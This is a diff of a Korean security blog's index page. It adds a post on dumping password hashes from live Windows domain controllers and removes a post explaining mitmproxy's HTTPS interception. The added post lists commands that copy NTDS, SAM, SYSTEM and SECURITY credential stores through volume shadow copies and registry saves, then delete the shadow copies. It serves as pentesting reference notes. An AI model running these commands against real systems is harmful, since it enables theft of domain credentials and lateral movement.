@@ -9,25 +9,16 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="TechNet blogs 에 올라온 글을 정리해본다. Understanding type confusion vulnerabilities: CVE-2015-0336 1
+  <meta name="description" content="Safely Dumping Hashes from Live Domain Controllers
+Tutorial for NTDS goodness
+Script recipe of the week: how to copy an opened file 1
 2
 3
 4
 5
 6
 7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-class Trigger
-{ &hellip;">
+8 &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -83,6 +74,77 @@ class Trigger
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/06/25/safely-dumping-hashes-from-live-domain-controllers/">Safely Dumping Hashes From Live Domain Controllers</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-06-25T23:42:42+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:42 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><ul>
+<li><a href="http://securityweekly.com/2011/11/02/safely-dumping-hashes-from-liv/">Safely Dumping Hashes from Live Domain Controllers</a></li>
+<li><a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Tutorial-for-NTDS-goodness-%28VSSADMIN,-WMIS,-NTDS-dit,-SYSTEM%29/">Tutorial for NTDS goodness</a></li>
+<li><a href="http://blogs.msdn.com/b/adioltean/archive/2005/01/05/346793.aspx">Script recipe of the week: how to copy an opened file</a></li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>C:\&gt; reg.exe query hklm\system\currentcontrolset\services\ntds\parameters
+</span><span class='line'>
+</span><span class='line'>C:\&gt; vssadmin create shadow /for=c:
+</span><span class='line'>
+</span><span class='line'>C:\&gt; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.git d:
+</span><span class='line'>C:\&gt; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SYSTEM d:
+</span><span class='line'>C:\&gt; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SAM d:
+</span><span class='line'>
+</span><span class='line'>C:\&gt; vssadmin delete shadows /for=c: /quiet
+</span><span class='line'>
+</span><span class='line'>C:\&gt; reg.exe save hklm\sam c:\temp\sam.sav
+</span><span class='line'>C:\&gt; reg.exe save hklm\security c:\temp\security.sav
+</span><span class='line'>C:\&gt; reg.exe save hklm\system c:\temp\system.sav
+</span><span class='line'>
+</span><span class='line'>$ python sd.py -sam ... -security ... -system ... LOCAL</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li><a href="http://www.sans.org/reading-room/whitepapers/testing/pass-the-hash-attacks-tools-mitigation-33283">Pass-the-hash attacks: Tools and Mitigation</a></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -830,59 +892,6 @@ Windows Server 2008R2 이하에서 돌아가는 Domain Controller 는 취약하�
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/06/10/mitmproxy/">Mitmproxy</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-06-10T14:47:29+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:47 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><h3>Explicit HTTP</h3>
-
-<p>Explicity proxy 로 설정하는 것이 제일 안정적.</p>
-
-<p>Client 는 proxy 에게 다음과 같은 proxy protocol 을 돌린다. RFC 2068.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>GET http://www.naver.com/index.html HTTP/1.1</span></code></pre></td></tr></table></div></figure>
-
-
-<h3>Explicit HTTPS</h3>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>CONNECT example.com:443 HTTP/1.1</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Server 인증서를 위조해야하기때문에, mitmproxy 를 디바이스에다가 trusted CA certificate 으로 등록해야한다.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>CONNECT 10.1.1.1:443 HTTP/1.1</span></code></pre></td></tr></table></div></figure>
-
-
-<p>와 같이 숫자로 오는 경우도 있기때문에, <code>upstream certificate sniffing</code> 을 수행한다.
-Client 로부터 <code>CONNECT</code> 를 받으면, 진짜 서버에 접속해서 SSL 핸드쉐이크를 돌려서, 서버의 인증서를 가져온다.
-여기서 CN 을 추출해, 이 CN 과 동일한 가짜 인증서를 만들고, mitmproxy CA 인증서로 서명한다.</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/5">&larr; Older</a>
@@ -900,6 +909,10 @@ Client 로부터 <code>CONNECT</code> 를 받으면, 진짜 서버에 접속해�
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/01/11/sock-sendpage/">Sock_sendpage</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2015/12/23/on-the-juniper-backdoor/">On the Juniper Backdoor</a>
       </li>
     
@@ -913,10 +926,6 @@ Client 로부터 <code>CONNECT</code> 를 받으면, 진짜 서버에 접속해�
     
       <li class="post">
         <a href="/blog/2015/10/02/the-inside-story-behind-ms08-067/">The Inside Story Behind MS08-067</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/09/17/rop-and-arm/">ROP and ARM</a>
       </li>
     
   </ul>
